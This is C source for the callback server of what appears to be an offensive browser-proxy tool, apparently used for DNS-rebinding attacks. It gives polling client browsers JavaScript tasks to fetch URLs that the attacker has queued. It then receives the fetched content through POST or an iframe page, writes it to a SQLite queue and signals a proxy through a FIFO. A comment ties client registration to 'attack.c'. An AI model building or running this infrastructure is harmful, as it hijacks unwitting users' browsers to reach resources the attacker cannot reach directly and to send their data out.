/* Handles callbacks from clients. Responsible for:
 * 	1) Accepting client callbacks and returning JavaScript to retrieve any URLs requested via the proxy server
 *	2) Handing out the IFrame post page for clients that don't support cross-domain requests
 *	3) Receiving the retrieved URL data, writing it to the database, and writing the response ID to the FIFO file
 *	   that the proxy server will read from to know that the response has been received.
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include "common.h"
#include "config.h"
#include "callback.h"
#include "socklib.h"
#include "iptables.h"
#include "sql.h"
#include "fifo.h"
#include "html.h"

/* Runs the primary callback service */
int callback_server()
{
	int rx_bytes = 0;
	int lsock = 0, csock = 0;
	int addrlen = sizeof(struct sockaddr_in);
	struct sockaddr_in clientaddr;
	char *buffer = NULL, *server_ip = NULL, *callback_port = NULL;

	memset((void *) &clientaddr,0,sizeof(struct sockaddr_in));

	server_ip = config_get_server_ip();
	callback_port = config_get_callback_port();

	/* Create TCP socket */
        if((lsock = create_socket(server_ip,atoi(callback_port),SOCK_STREAM)) == SOCK_FAIL){
                glog("Failed to create callback server TCP socket",LOG_ERROR_TYPE);
		if(server_ip) free(server_ip);
		if(callback_port) free(callback_port);
                return EXIT_FAILURE;
	}
	if(server_ip) free(server_ip);
	if(callback_port) free(callback_port);

	while(1){

		/* Accept incoming connection */
                if((csock = accept(lsock,(struct sockaddr *) &clientaddr,(socklen_t *) &addrlen)) < 0){
                        glog("Failed to accept TCP connection to callback server",LOG_ERROR_TYPE);
                        if(buffer) free(buffer);
                        return EXIT_FAILURE;
                }

		/* Fork a child to handle the request */
		if(!fork()){

			/* Receive data */
			if((buffer = receive(lsock,SOCK_STREAM,&rx_bytes,csock,&clientaddr)) == NULL){
				glog("Failed to read client data returned to callback server",LOG_ERROR_TYPE);
				exit(EXIT_FAILURE);
			}

			process_request(buffer,rx_bytes,csock,&clientaddr);

			/* Quit the child process */
			close_socket(csock);
			if(buffer) free(buffer);
			exit(EXIT_SUCCESS);
		}
	}

	/* Close up shop */
	close_socket(csock);
	close_socket(lsock);

	return EXIT_FAILURE;
}

/* Process incoming HTTP callback requests */
int process_request(char *buffer, int data_len, int csock, struct sockaddr_in *clientaddr)
{
	int id = 0, response_size = 0, err_code = 0, min_request_size = 0;
	char *decoded_data = NULL, *insert_data = NULL;
	char *data_ptr = NULL, *body_ptr = NULL;
	char *id_ptr = NULL, *client_ip_address = NULL;

	min_request_size = HTTP_POST_SIZE + (SPACE_SIZE*2) + HTTP_END_HEADERS_SIZE + EXEC_REQUEST_SIZE;
	if(data_len < min_request_size){
		glog("Received invalid callback request",LOG_ERROR_TYPE);
		return 0;
	}

	/* Get the client's IP address */
	client_ip_address = strdup(inet_ntoa(clientaddr->sin_addr));
	if(client_ip_address == NULL){
		perror("Strdup failure");	
		return 0;
	}

	/* URL decode the request */	
	decoded_data = url_decode(buffer,&data_len);
	if(!decoded_data){
		glog("Failed to decode HTTP POST data",LOG_ERROR_TYPE);
		if(client_ip_address) free(client_ip_address);
		return 0;
	}

	/* Check for POST requests */
	if(memcmp(buffer,HTTP_POST,HTTP_POST_SIZE) == 0){
	
		/* Get a pointer to the body of the POST request */
                body_ptr = strstr(decoded_data,HTTP_END_HEADERS);
                if(body_ptr == NULL){
                        if(client_ip_address) free(client_ip_address);
			if(decoded_data) free(decoded_data);
                        return 0;
                }
                body_ptr += HTTP_END_HEADERS_SIZE;

		/* If the callback is a to the EXEC_REQUEST page, process the data callback */	
		if(memcmp((buffer+HTTP_POST_SIZE+SPACE_SIZE),EXEC_REQUEST,EXEC_REQUEST_SIZE) == 0){
		
			/* Get pointers to the expected HTTP POST parameters */
			id_ptr = strstr(body_ptr,URL_ID);
			data_ptr = strstr(body_ptr,URL_DATA);
			if(!id_ptr || !data_ptr){
				if(client_ip_address) free(client_ip_address);
				if(decoded_data) free(decoded_data);
				return 0;
			}

			/* NULL out the URL_DATA parameter to ensure that the URL_ID value is null-terminated */
			memset(data_ptr,0,URL_DATA_SIZE);

			/* Point the pointers at the actual data that follow their keywords */
			id_ptr += URL_ID_SIZE;
			data_ptr += URL_DATA_SIZE;

			/* Update data_len to reflect the size of the actual payload data that was recevied */
			data_len -= (data_ptr - decoded_data);

			/* Convert the ID value to an integer */
			id = strtol(id_ptr,NULL,10);
			if((id <= 0) || (errno == ERANGE)){
				glog("Received invalid callback ID",LOG_ERROR_TYPE);
				if(client_ip_address) free(client_ip_address);
				if(decoded_data) free(decoded_data);
				return 0;
			}

			/* Send the OK response to the client */
			if(send_http_response(csock,RESPONSE_OK,RESPONSE_OK_SIZE) == SOCK_FAIL){
                	        glog("Failed to send RESPONSE_OK message to client socket",LOG_ERROR_TYPE);
	                }

			/* Insert data into database */	
			insert_data = sqlite3_mprintf("UPDATE %s SET rdata = %Q WHERE id = '%d'",QUEUE_TABLE,data_ptr,id);
			sql_exec(insert_data,&response_size,&err_code);
			sqlite3_free(insert_data);
			if(err_code != SQLITE_OK){
				sql_log_error();
				if(client_ip_address) free(client_ip_address);
                                if(decoded_data) free(decoded_data);
				return 0;
			}
			
			write_to_fifo(id);
		}

	/* Check for GET requests */
	} else if(memcmp(buffer,HTTP_GET,HTTP_GET_SIZE) == 0){

		/* Look for requests asking for the POST_PAGE. This page is used by clients
		 * who do not support cross-domain XMLHttpRequests and is loaded into an
		 * IFrame in the client browser's DOM. 
		 */
		if(memcmp(buffer+HTTP_GET_SIZE+SPACE_SIZE,POST_PAGE,POST_PAGE_SIZE) == 0){

			if(send_http_response(csock,POST_HTML,POST_HTML_SIZE) == SOCK_FAIL){
				glog("Failed to return cross-domain XMLHTTPRequest page",LOG_ERROR_TYPE);
			}

		/* Check for POLL_PAGE requests. These are periodic requests made by the client
		 * to check for new tasking.
		 */
                } else if(memcmp((buffer+HTTP_GET_SIZE+SPACE_SIZE),POLL_PAGE,POLL_PAGE_SIZE) == 0){
			update_client_list(client_ip_address);
			send_poll_response(csock,client_ip_address);

		/* Default GET request response */
		} else {
			if(send_http_response(csock,NULL,0) == SOCK_FAIL){
				glog("Failed to send NULL response message to client socket",LOG_ERROR_TYPE);
			}
		}

	/* Just respond with the default headers for all other HTTP methods. This is required in order ot
	 * properly support cross domain XMLHttpRequests, as the browser may use HEAD requests to determine
	 * if XMLHttpRequests are allowed.
	 */
	} else {
		send_http_response_headers(csock, 0);
	}

	if(client_ip_address) free(client_ip_address);
	if(decoded_data) free(decoded_data);
	
	return 1;
}

/* As the browser polls back for more data to execute, grab the next entry out of the queue table and return it */
void send_poll_response(int csock, char *client_ip_address)
{
	char *sql_id = sqlite3_mprintf("SELECT id FROM %s WHERE host = %Q AND sent = 0 ORDER BY id LIMIT 1",QUEUE_TABLE,client_ip_address);
	char *sql_update = NULL, *sql_url = NULL, *sql_pdata = NULL, *sql_headers = NULL;
	char *url = NULL, *pdata = NULL, *headers = NULL, *id = NULL, *data = NULL;
	char *r_pdata = NULL, *r_headers = NULL, *user_headers = NULL;
	int response_size = 0, err_code = 0, data_size = 0;

	/* Get the id of the next queued request for this client */
	id = sql_exec(sql_id,&response_size,&err_code);
	sqlite3_free(sql_id);
	if(err_code != SQLITE_OK){
		sql_log_error();
		if(id) free(id);
		return;
	}

	if(id){

		/* Update that id to indicate that we're processing it */
		sql_update = sqlite3_mprintf("UPDATE %s SET sent = 1 WHERE id = %Q",QUEUE_TABLE,id);
		sql_exec(sql_update,&response_size,&err_code);
		sqlite3_free(sql_update);
		if(err_code != SQLITE_OK){
			sql_log_error();
			if(id) free(id);
			return;
		}

		/* Get the url, post data and HTTP headers to pass back to the JavaScript */
		sql_url = sqlite3_mprintf("SELECT url FROM %s WHERE id = %Q",QUEUE_TABLE,id);
		sql_pdata = sqlite3_mprintf("SELECT pdata FROM %s WHERE id = %Q",QUEUE_TABLE,id);
		sql_headers = sqlite3_mprintf("SELECT headers FROM %s WHERE id = %Q",QUEUE_TABLE,id);

		url = sql_exec(sql_url,&response_size, &err_code);
		if(err_code == SQLITE_OK){
			pdata = sql_exec(sql_pdata,&response_size, &err_code);
			if(err_code == SQLITE_OK){
				headers = sql_exec(sql_headers,&response_size, &err_code);
			}
		}

		/* URL encode the headers and post data, if any. Because this data was allocated by SQLite,
		 * it has to be freed by SQLite. To make sure we don't step on any toes, we'll make a copy
		 * of it before encoding it.
		 */
		if(pdata){
			r_pdata = strdup(pdata);
			r_pdata = url_encode(r_pdata);
		}
		if(headers){
			r_headers = strdup(headers);
			r_headers = url_encode(r_headers);
		}

		user_headers = get_user_defined_headers();
		if(user_headers != NULL){
			js_format_headers(user_headers);
		}

		if(user_headers){
			data = sqlite3_mprintf("request(%Q,%Q,%Q,'%q%%%%%q');",id,url,r_pdata,r_headers,user_headers);
		} else {
			data = sqlite3_mprintf("request(%Q,%Q,%Q,%Q);",id,url,r_pdata,r_headers);
		}

		if(data){
			data_size = (int) strlen(data);
		} else {
			glog("Failed to generate poll response JavaScript code",LOG_ERROR_TYPE);
		}

		if(r_pdata) free(r_pdata);
		if(r_headers) free(r_headers);
		if(user_headers) free(user_headers);
	} else {
		data = NULL;
		data_size = 0;
	}

	/* Send response to client */
	if(send_http_response(csock,data,data_size) == SOCK_FAIL){
		glog("Failed to send poll response to client socket",LOG_ERROR_TYPE);
	}

	/* Clean up */
	if(data) sqlite3_free(data);
	if(sql_url) sqlite3_free(sql_url);
	if(sql_pdata) sqlite3_free(sql_pdata);
	if(sql_headers) sqlite3_free(sql_headers);
	if(id) free(id);
	if(url) free(url);
	if(pdata) free(pdata);
	if(headers) free(headers);
	return;
}

/* Return a string of raw user-defined headers as specified in the headers table */
char *get_user_defined_headers()
{
        char *sql = NULL, *header = NULL, *headers = NULL, *user_headers = NULL, *tmp = NULL;
        sqlite3_stmt *stmt = NULL;
        int rc = 0, col_type = 0, headers_size = 0;

        /* Prepare the SQL query */
        sql = sqlite3_mprintf("SELECT header FROM %s",HEADERS_TABLE);
	if(!sql){
		sql_log_error();
		return NULL;
	}

        rc = sqlite3_prepare_v2(globals.db,sql,strlen(sql),&stmt,NULL);
        if(rc != SQLITE_OK){
                sql_log_error();
                return NULL;
        }

        /* Loop until the query has finished */
        while(((rc = sqlite3_step(stmt)) != SQLITE_DONE)){
                switch(rc){

                        case SQLITE_ERROR:
                                sql_log_error();
                                break;

                        case SQLITE_BUSY:
                                /* If the table is locked, wait then try again */
                                usleep(BUSY_WAIT_PERIOD);
                                break;

                        case SQLITE_ROW:
                        {
                                col_type = sqlite3_column_type(stmt,0);
                                switch(col_type)
                                {
                                        case SQLITE_TEXT:
                                                tmp = headers;
                                                header = (void *) sqlite3_column_text(stmt,0);
                                                if(!headers){
                                                        headers = sqlite3_mprintf("%s",header);
                                                } else {
                                                        headers = sqlite3_mprintf("%s%s%s",headers,CRLF,header);
                                                }
                                                if(tmp) sqlite3_free(tmp);
                                                tmp = NULL;
                                                break;

                                }
                        }
                }
        }

        /* Want to be able to free the results with a normal free() */
	if(headers){
		headers_size = strlen(headers);

	        user_headers = malloc(headers_size+1);
	        if(!user_headers){
	                perror("Malloc failure");
	        } else {
	                memset(user_headers,0,headers_size+1);
	                memcpy(user_headers,headers,headers_size);
	        }
	}

        sqlite3_finalize(stmt);
        sqlite3_free(sql);
        sqlite3_free(headers);

        return user_headers;
}

/* Update the client table with the specified IP's latest callback; if the client is valid, their IP will 
 * have been inserted into the database by the attack.c code already. If their IP is not in the database,
 * then nothing will get updated.
 */
void update_client_list(char *ip)
{
	char *update_clients = NULL;
	int err_code = 0, response_size = 0;
	float timeout = 0;

	timeout = (float) config_get_connection_timeout();

	/* Update the CLIENTS_TABLE with the next expected callback time, which is connection_timeout seconds from now */
	update_clients = sqlite3_mprintf("UPDATE %s SET callback_time = DATETIME('now','+%f seconds') WHERE ip = %Q",CLIENTS_TABLE,timeout,ip);

	/* Update callback time for the given IP address */
	sql_exec(update_clients,&response_size,&err_code);
	if(err_code != SQLITE_OK){
		sql_log_error();
	}

	sqlite3_free(update_clients);
	return;
}

/* URL decoding function. Code taken from "Secure Programming Cookbook for C and C++" */
char *url_decode(char *url, int *url_len) 
{
	char *out = NULL, *ptr = NULL, *c = NULL;
	int loop_counter = 0;
  	int loop_len = *url_len;
 
  	if (!(ptr = strdup(url))){
		return NULL;
	} else {
		out = ptr;
	}

	/* Loop through URL, decoding any URL-encoded bytes */
  	for (c = url;  loop_counter < loop_len;  c++,loop_counter++) {
		/* If this is not a URL-encoded sequence (%XX), then skip it and go to the next byte */
    		if (*c != '%' || !isxdigit(c[1]) || !isxdigit(c[2])) {
			*ptr++ = *c;
		/* Else convert the two hex bytes to ASCII */
    		} else {
      			*ptr++ = (BASE16_TO_10(c[1]) * 16) + (BASE16_TO_10(c[2]));
      			c += 2;
    		}
  	}

	/* url_len does not include the trailing NULL byte */
  	if (url_len){
		*url_len = (ptr - out);
	}

  	*ptr = 0;
  	return out;
}
